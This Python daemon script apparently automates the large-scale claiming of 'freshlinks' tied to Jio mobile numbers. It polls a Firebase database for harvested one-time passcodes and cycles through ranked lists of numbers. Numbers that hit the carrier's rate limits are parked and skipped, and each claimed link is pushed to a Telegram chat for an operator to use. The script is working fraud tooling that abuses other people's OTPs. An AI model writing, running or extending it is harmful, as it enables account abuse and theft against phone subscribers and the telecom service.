#!/usr/bin/env python3
"""freshlink_daemon.py — continuous freshlink pump.

Runs the claim cycle in a loop.  Every freshlink is appended to
data/freshlinks.jsonl and reported to Telegram (this chat) so King Davin can
claim it immediately.  Numbers that Jio rate-limits are parked in
data/locked_numbers.json and skipped on later passes.

Usage:
    python3 freshlink_daemon.py [--interval 120] [--max-per-pass 3]
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from claim_runner import DATA, LINKS_FILE, LOCKED_FILE, claim_one, load_json
from otp_harvest import JioOtpHarvester

TG_CHAT_ID = "5096026302"
STATE = DATA / "daemon_state.json"


def notify(text: str) -> None:
    """Write a notification line for the Hermes notifier to pick up."""
    out = DATA / "notify.log"
    with out.open("a") as fh:
        fh.write(json.dumps({"chat_id": TG_CHAT_ID, "text": text,
                             "ts": int(time.time())}) + "\n")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://gas3-6b801-default-rtdb.firebaseio.com")
    ap.add_argument("--interval", type=int, default=120)
    ap.add_argument("--max-per-pass", type=int, default=3)
    ap.add_argument("--timeout", type=int, default=75)
    args = ap.parse_args()

    h = JioOtpHarvester(args.base, poll=3)
    total = 0
    passes = 0

    while True:
        passes += 1
        locked = set(load_json(LOCKED_FILE, []))
        done = set()
        if LINKS_FILE.exists():
            done = {json.loads(l)["mobile"] for l in LINKS_FILE.read_text().splitlines()
                    if l.strip()}
        rows = load_json(DATA / "fresh_ranked.json", [])
        fresh = [r["mobile"] for r in rows if r["mobile"] not in locked | done]

        STATE.write_text(json.dumps({"pass": passes, "total_links": total,
                                     "locked": len(locked), "done": len(done),
                                     "candidates": len(fresh),
                                     "last_run": int(time.time())}, indent=1))

        if not fresh:
            notify("freshlink daemon: kandidat habis, refresh ranking...")
            import subprocess
            subprocess.run([sys.executable, str(Path(__file__).with_name("pick_fresh.py")),
                            "--minutes", "30", "--top", "40"],
                           capture_output=True, timeout=240)
            time.sleep(args.interval)
            continue

        got = 0
        for mob in fresh:
            if got >= args.max_per_pass:
                break
            try:
                res = claim_one(h, mob, args.timeout)
            except Exception as exc:  # keep the daemon alive
                notify(f"freshlink daemon error on {mob}: {type(exc).__name__}")
                continue
            if res["ok"]:
                total += 1
                notify(f"FRESHLINK {mob}\n{res['url']}")
            elif res["status"] in ("locked", "not_jio_number"):
                locked.add(mob)
                LOCKED_FILE.write_text(json.dumps(sorted(locked)))

        time.sleep(args.interval)


if __name__ == "__main__":
    main()
